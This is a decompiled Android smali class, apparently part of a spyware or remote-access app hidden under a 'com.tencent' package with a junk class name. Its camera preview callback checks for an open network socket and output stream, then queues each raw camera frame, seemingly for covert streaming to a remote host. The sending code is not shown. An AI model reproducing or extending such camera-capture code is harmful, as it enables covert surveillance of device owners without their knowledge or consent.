.class Lcom/tencent/tunesxconcerningn106$2;
.super Ljava/lang/Object;
.source "tunesxconcerningn106.java"

# interfaces
.implements Landroid/hardware/Camera$PreviewCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/tunesxconcerningn106;->surfaceChanged(Landroid/view/SurfaceHolder;III)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/tunesxconcerningn106;


# direct methods
.method constructor <init>(Lcom/tencent/tunesxconcerningn106;)V
    .locals 0

    .line 250
    iput-object p1, p0, Lcom/tencent/tunesxconcerningn106$2;->this$0:Lcom/tencent/tunesxconcerningn106;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPreviewFrame([BLandroid/hardware/Camera;)V
    .locals 1

    if-nez p1, :cond_0

    return-void

    .line 255
    :cond_0
    :try_start_0
    sget-object p2, Lcom/tencent/tunesxconcerningn106;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    if-eqz p2, :cond_1

    iget-object p2, p0, Lcom/tencent/tunesxconcerningn106$2;->this$0:Lcom/tencent/tunesxconcerningn106;

    iget-boolean p2, p2, Lcom/tencent/tunesxconcerningn106;->ctd:Z

    const/4 v0, 0x1

    if-ne p2, v0, :cond_1

    sget-object p2, Lcom/tencent/tunesxconcerningn106;->o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

    if-eqz p2, :cond_1

    .line 258
    invoke-static {}, Lcom/tencent/tunesxconcerningn106;->access$100()Ljava/lang/Object;

    move-result-object p2

    monitor-enter p2
    :try_end_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 259
    :try_start_1
    iget-object v0, p0, Lcom/tencent/tunesxconcerningn106$2;->this$0:Lcom/tencent/tunesxconcerningn106;

    invoke-static {v0}, Lcom/tencent/tunesxconcerningn106;->access$200(Lcom/tencent/tunesxconcerningn106;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 260
    monitor-exit p2

    goto :goto_0

    :catchall_0
    move-exception p1

    monitor-exit p2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw p1
    :try_end_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method
